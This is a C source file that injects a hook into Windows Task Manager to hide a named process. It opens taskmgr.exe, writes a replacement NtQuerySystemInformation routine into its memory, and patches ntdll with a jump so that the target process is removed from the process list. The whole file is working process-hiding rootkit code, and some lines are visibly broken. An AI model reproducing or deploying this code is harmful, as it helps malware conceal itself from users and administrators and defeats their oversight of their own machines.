#include "Stealth.h"
#pragma warning(suppress : 4996)

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define Lower(s1) s1 >=65 && s1<=90 ? (wchar_t)s1 +32 : s1

ULONGLONG GetAddressOfFunctionAddress(PVOID Func);


NTSTATUS NTAPI NewNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID                    SystemInformation,
    ULONG                    SystemInformationLength,
    PULONG                   ReturnLength) {

    volatile NTSTATUS* CloneNtQuerySystemInformation = 0xAAAAAAAAAAAAAAAA;
    wchar_t* HideProcessName = (ULONGLONG)  + 0x18;

    NTSTATUS ntstatus = ((NTSTATUS(*)(
        SYSTEM_INFORMATION_CLASS SystemInformationClass,
        PVOID                    SystemInformation,
        ULONG                    SystemInformationLength,
        PULONG                   ReturnLength))CloneNtQuerySystemInformation)(
            SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);


    if (ntstatus != STATUS_SUCCESS)
    {
        return ntstatus;
    }

    PSYSTEM_PROCESS_INFORMATION  pCur = SystemInformation;
    PSYSTEM_PROCESS_INFORMATION  pPrev = pCur;
    pCur = (ULONGLONG)pCur+pCur->NextEntryOffset;
    while(TRUE) {
            BOOL ret= TRUE;
            wchar_t s1, s2;
            for (int i = 0; (*(HideProcessName + i) != NULL) && (*(pCur->ImageName.Buffer + i) != NULL); i++) {
                s1 = Lower(*(HideProcessName + i));
                s2 = Lower(*(pCur->ImageName.Buffer + i));
                ret = (s1 == s2) ? TRUE : FALSE;
                if (ret == FALSE)
                    break;
            }

            if (ret) {
                if (pCur->NextEntryOffset == 0)
                    pPrev->NextEntryOffset = 0;
                else
                    pPrev->NextEntryOffset += pCur->NextEntryOffset;
            }
            else
                pPrev = pCur;

            if (pCur->NextEntryOffset == 0) 
                break;
            
            pCur = (ULONGLONG)pCur+pCur->NextEntryOffset;
        }


    return ntstatus;
}

DWORD GetProcessPID(LPWSTR name) {
    PSYSTEM_PROCESS_INFORMATION spi;
    ULONG Length=0;
    DWORD processID=0;
    
    while (TRUE) {
        if (NtQuerySystemInformation(5, NULL, NULL, &Length) != STATUS_INFO_LENGTH_MISMATCH)
            continue;

        spi = VirtualAlloc(NULL, Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (spi == NULL)
            continue;
       
        if (NT_SUCCESS(NtQuerySystemInformation(5, spi, Length, &Length)))
            break;

        VirtualFree(spi,0, MEM_RELEASE);
    }

    //PSYSTEM_PROCESS_INFORMATION temp = spi;
    spi = (ULONGLONG)spi + spi->NextEntryOffset;
    while (TRUE)
    {
        if (wcsicmp(spi->ImageName.Buffer, name)==0) {
            processID = spi->UniqueProcessId;
            break;
        }
        if (spi->NextEntryOffset == 0)
            break;
        
        spi = (ULONGLONG)spi + spi->NextEntryOffset;
    }


    //VirtualFree(temp, Length, MEM_DECOMMIT);
    //VirtualFree(temp, 0, MEM_RELEASE);
    return processID;
}

int ByteArray(BYTE* Array, ULONGLONG Address) {

    for (int i = 0; i < 8; i++) {
        Array[8-i-1] = Address >> ((8-i-1) * 8);
    }
    return 0;
}



int findOffset(PVOID FuncAddress) {
    ULONGLONG CC = 0xAAAAAAAAAAAAAAAA;
    for (int size = 0;; size++) {
        if (memcmp((ULONGLONG)FuncAddress + size, &CC, 8) == 0) {
            return size;
        }
    }
}


void Stealth(LPWSTR Target){
    LPWSTR name = L"taskmgr.exe";
    LPWSTR name2 = Target;
    int size;
    HANDLE Process;
    PVOID FuncAddress;
    LPVOID Temp;
    BYTE Jump_code[12] = { 0x48,0xb8, };
    PVOID NtQuerySystemInformation = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    DWORD Old;
    ULONGLONG CC = 0xCCCCCCCCCCCCCCCC;
    ULONGLONG offsetAddress[] = {0,};
    int offset;


    DWORD processId = GetProcessPID(name);
    printf("PID: %d\n", processId);
    Process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (Process == NULL) {
        printf("OpenProcess Errror %x", GetLastError());
        return 0;
    }
    printf("NtQuerySystemInformation Address: %p\n", NtQuerySystemInformation);
    FuncAddress = (ULONGLONG)NewNtQuerySystemInformation;


    for (size = 0;;  size++) {
        if (memcmp((ULONGLONG)FuncAddress + size, &CC, 8)==0) {
            break;
        }
    }
    printf("size: %llx\n", size);
    printf("offsetAddress: %p\n", offsetAddress);
    BYTE* NtQuerysystemInformain_ByteCode = (BYTE*)malloc(size);
    if (NtQuerysystemInformain_ByteCode == NULL) {
        printf("malloc Error %x\n", GetLastError());
    }


    memcpy_s(NtQuerysystemInformain_ByteCode, size, (ULONGLONG)FuncAddress, size);
    offset = findOffset(NewNtQuerySystemInformation);
    printf("offset %x\n", offset);
    BYTE* inject_ByteCode = (BYTE*)malloc(size+0x18);
    if (inject_ByteCode == NULL) {
        printf("malloc Error %x\n", GetLastError());
        return 0;
    }

    Temp = VirtualAllocEx(Process, NULL, size+0x18, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("HookFunc Address: %p\n", Temp);

    if (Temp == NULL) {
        printf("VirtualAllocEx Error %x\n", GetLastError());
        free(inject_ByteCode);
        return 0;
    }
    ByteArray(offsetAddress, ((ULONGLONG)Temp + (ULONGLONG)size));


    memcpy_s(inject_ByteCode, size, NtQuerysystemInformain_ByteCode, size);
    memcpy_s(&inject_ByteCode[size], 0x18, NtQuerySystemInformation, 0x18);

    memcpy_s(&inject_ByteCode[offset], 0x8, offsetAddress, 0x8);

    ByteArray(&Jump_code[2], (ULONGLONG)Temp);
    Jump_code[10] = 0xff;
    Jump_code[11] = 0xE0;


    if (WriteProcessMemory(Process, Temp, inject_ByteCode, size + 0x18 , NULL) == 0) {
        printf("WriteProcessMemory Error %x\n", GetLastError());
        free(inject_ByteCode);
        return 0;
    }

    if (WriteProcessMemory(Process, (ULONGLONG)Temp+ size + 0x18, name2, wcslen(name2)*2, NULL) == 0) {
        printf("WriteProcessMemory Error %x\n", GetLastError());
        free(inject_ByteCode);
        return 0;
    }


    if (VirtualProtectEx(Process, NtQuerySystemInformation, sizeof(Jump_code), PAGE_EXECUTE_READWRITE, &Old) == FALSE) {
        printf(" 1VirtualProtectEx Error %x\n", GetLastError());
        free(inject_ByteCode);
        return 0;
    }



    if (WriteProcessMemory(Process, NtQuerySystemInformation, Jump_code, sizeof(Jump_code), NULL) == 0) {
        printf("WriteProcessMemory Error %x\n", GetLastError());
        free(inject_ByteCode);
        return 0;
    }

}

